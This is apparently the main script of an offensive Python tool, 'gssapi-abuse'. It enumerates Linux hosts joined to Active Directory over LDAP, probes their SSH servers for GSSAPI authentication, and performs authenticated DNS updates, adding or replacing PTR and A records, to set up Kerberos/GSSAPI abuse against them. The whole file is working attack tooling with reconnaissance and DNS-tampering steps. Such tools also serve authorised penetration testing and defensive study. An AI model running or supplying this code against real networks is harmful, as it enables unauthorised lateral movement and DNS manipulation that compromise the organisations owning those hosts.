import logging
import sys
import utils
import dns.query
import dns.name
import dns.reversename
import dns.message
import dns.resolver
import dns.exception
import paramiko
import socket
import argparse

from addns import SecureDnsUpdates
from computersearch import ComputerSearch

def gssapi_supported(host : str) -> bool :

    try:
        s = socket.socket()
        s.connect((host, 22))
        t = paramiko.Transport(s)
        t.connect()
        t.auth_none('')

    except paramiko.BadAuthenticationType as err:
        for type in err.allowed_types:
            if 'gssapi' in type:
                return True
    except Exception:
        return False
    
            
    return False

def setup_logging(verbose):

    root = logging.getLogger()
    handler_level = logging.INFO

    if verbose is False:
        root.setLevel(logging.INFO)
        logging.getLogger('paramiko.transport').setLevel(logging.WARNING)
        logging.getLogger('securedns').setLevel(logging.INFO)
    else:
        root.setLevel(logging.DEBUG)  
        handler_level = logging.DEBUG      
        
    handler = logging.StreamHandler(sys.stdout)
    handler.setLevel(handler_level)
    formatter = None

    if verbose:
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    else:
        formatter = logging.Formatter('%(message)s')      

    handler.setFormatter(formatter)
    root.addHandler(handler) 

def dns_updates(args : argparse.Namespace, log : logging.Logger):

    secure_dns = None

    if args.zone == None:
        secure_dns = SecureDnsUpdates('%s.' % args.domain, args.dc)
    else:
        secure_dns = SecureDnsUpdates('%s.' % args.zone, args.dc)        

    if args.action == 'add':
        log.info("[=] Adding %s record for target %s using data %s" % (args.type, args.target, args.data))
        secure_dns.add(args.target, args.type, '300', args.data)
    elif args.action == 'remove':
        log.info("[=] Removing %s record for target %s" % (args.type, args.target))
        secure_dns.delete(args.target)  
    if args.action == 'update':
        log.info("[=] Updating %s record for target %s using data %s" % (args.type, args.target, args.data))
        secure_dns.replace(args.target, args.type, '300', args.data)              
    
    secure_dns.apply()

def enum(args : argparse.Namespace , log : logging.Logger):

    dc = args.domain
    if args.dc is not None:
        dc = args.dc

    search = ComputerSearch("ldap://%s" % dc, '%s\\%s' % (args.domain, args.user), args.password)
    results = search.find_linux_hosts()
    dns_cache = dict()
    
    print("[=] Found %d non Windows machines registered within AD" % len(results))
    
    for host in results:
    
        log.debug("[=] Querying host %s for GSSAPI abuse potential" % host)
      
        hostName = dns.name.from_text(host)
        domain = hostName.parent().to_text(True)
                       
        if(domain not in dns_cache.keys()):
            try:
                dns_cache[domain] = utils.get_soa(domain, args.dc)
            except dns.exception.Timeout:
                log.info("[!] Host %s does not have a DNS records, ignoring" % host)
                continue

        dns_server = dns_cache[domain]

        res = dns.resolver.Resolver(False)
        res.nameservers = [dns_server[1]]

        try:
            response = res.resolve(hostName, 'A', tcp=True)
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
            log.debug("[!] Host %s does not have an A record, igorning" % hostName)
            continue

        address = response[0].address
        reverse = ''
        reverse_zone = dns.reversename.from_address(address)
        reverse_match = True

        try:
            response = res.resolve_address(address)
            reverse = response[0].target.to_text(True)
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
            log.debug("[!] IP %s for host %s does not have an PTR record, igorning" % (address, hostName))

        if reverse != host:
            reverse_match = False
            found = False
            for parent in range(0, 3):
                try:  
                    log.debug("[=] Attempting to resolve SOA for reverse zone %s" % reverse_zone.parent().to_text()) 
                    utils.get_nameserver(reverse_zone.parent().to_text(), args.dc)
                    found = True 
                    break                 
                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout):   
                    reverse_zone = reverse_zone.parent()            
                    continue
        
            if not found:
                log.info("[!] Ignoring host %s because does not have a PTR record and the zone %s does not exist, we cant add new records :(" % (host, reverse_zone.parent().to_text()))
                continue 

        if gssapi_supported(host) == True:        
            if reverse_match:
                log.info("[+] Host %s has GSSAPI enabled over SSH" % host)
            else:
                log.info("[+] Host %s has GSSAPI enabled over SSH but the PTR record for IP address %s is incorrect.  Use dns mode to create a PTR record" % (host, address))
        else:
            log.info("[!] Host %s does not have GSSAPI enabled over SSH, ignoring" % host)

def main() -> int:

    parser = argparse.ArgumentParser(
                        prog='gssapi-abuse',
                        description='Enumerate and abuse Kerberos MIT hosts joined to Active Directory domains')
    
    subparsers = parser.add_subparsers(help='enum or dns mode', required=True, dest="command")


    enum_parser = subparsers.add_parser('enum', help='Enumerate hosts that are potentially vulnerable to GSSAPI abuse')
    enum_parser.add_argument('-u', '--user', required=True, help="User to authenticate to LDAP with") 
    enum_parser.add_argument('-p', '--password', required=True, help='Password for the LDAP user')     
    enum_parser.set_defaults(func=enum) 
          
    dns_parser = subparsers.add_parser('dns', help='Perform secure DNS updates')
    dns_parser.add_argument('-t', '--target', required=True, help="The target DNS record name when executing DNS updates")  
    dns_parser.add_argument('-a', '--action', choices=['add','remove', 'update'], required=True, help="The DNS action to take. 'add','remove' or 'update' is supported")  
    dns_parser.add_argument('--type', required=True, help="The DNS record type to perform the action on, e.g PTR or A record")  
    dns_parser.add_argument('--data', help="The DNS record data, e.g. 1.2.3.4 for A record")  
    dns_parser.add_argument('--zone', help="The DNS zone to update, if ommited, the target AD domain name is used") 
    dns_parser.set_defaults(func=dns_updates)    
    
    parser.add_argument('--dc', help="Force a specific domain controller to use")    
    parser.add_argument('-d', '--domain', required=True, help="The target AD domain")       
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")  # on/off flag    
 
    args = parser.parse_args()

    setup_logging(args.verbose)

    log = logging.getLogger('gssapi-abuse')

    args.func(args, log)    
    return 0

if __name__ == '__main__':    
    sys.exit(main())  # next section explains the use of sys.exit